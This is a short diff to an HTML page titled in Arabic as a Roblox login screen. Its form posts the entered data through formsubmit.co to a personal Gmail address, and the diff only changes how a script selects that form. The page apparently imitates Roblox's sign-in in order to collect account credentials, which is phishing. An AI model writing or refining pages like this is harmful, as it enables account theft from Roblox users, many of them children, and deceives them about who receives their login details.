@@ -99,7 +99,7 @@ body{
   <div class="box">
     <h2>تسجيل الدخول إلى Roblox</h2>
 
-    <form id="loginForm" action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
+    <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
 
       <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
       <input type="hidden" name="_template" value="table">
@@ -120,7 +120,7 @@ body{
 </div>
 
 <script>
-const form = document.getElementById("loginForm");
+const form = document.querySelector("form");
 
 form.addEventListener("submit", function(e){
   e.preventDefault();
